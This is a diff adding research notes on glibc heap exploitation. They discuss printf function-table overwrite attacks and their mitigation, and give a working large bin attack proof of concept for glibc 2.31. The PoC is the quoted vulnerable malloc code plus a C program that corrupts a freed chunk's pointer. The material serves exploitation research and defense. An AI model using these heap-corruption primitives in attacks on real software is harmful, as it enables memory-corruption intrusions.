@@ -1,0 +1,56 @@
+The noprintf version is used to mitigate against printf format redefinition attacks, however, the approach is far from elegant...
+If it is provable that such attacks are not possible, or better(more natural seeming) implementations can achieve same affect, I'll gladly opt to it and drop this version
+
+**namely overwrite of those four table pointers
+__printf_function_table
+__printf_arginfo_table
+__printf_modifier_table
+__printf_va_arg_table
+
+
+I'm still a bit worried about hijacking fastbin_max and dropping heap pointers everywhere though..., can't come up with an easier(and as reliable) exploit than current one, but that doesn't mean there are none...
+
+
+crap... Large bin attack appears to still be possible in glibc2.31, using another branch, POC below
+
+	Vuln code:
+
+		if (fwd != bck){
+		  /* Or with inuse bit to speed comparisons */
+		  size |= PREV_INUSE;
+		  /* if smaller than smallest, bypass loop below */
+		  assert (chunk_main_arena (bck->bk));
+		  if ((unsigned long)(size)<(unsigned long) chunksize_nomask (bck->bk)){
+		    fwd = bck;
+		    bck = bck->bk;
+		    victim->fd_nextsize = fwd->fd;
+			victim->bk_nextsize = fwd->fd->bk_nextsize;
+			fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
+		  }
+
+	Exploit:
+
+		#include<stdio.h>
+		#include<stdlib.h>
+
+		int main(){
+		  setvbuf(stdin,NULL,_IONBF,0);
+		  setvbuf(stdout,NULL,_IONBF,0);
+		  char buffer1[0x30]="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+		  char *a = malloc(0x458);
+		  char *b = malloc(0x18);
+		  char *c = malloc(0x468);
+		  char *d = malloc(0x18);
+		  char *e = malloc(0x448);
+		  char *f = malloc(0x18);
+		  free(a);
+		  free(c);
+		  char *g = malloc(0x478);
+		  free(e);
+		  getchar();
+		  ((unsigned long long int*)c)[3] = ((unsigned long long int)buffer1)-0x20;
+		  char *h = malloc(0x478);
+		  printf("%s\n",buffer1);
+		  return 0;
+		}
+
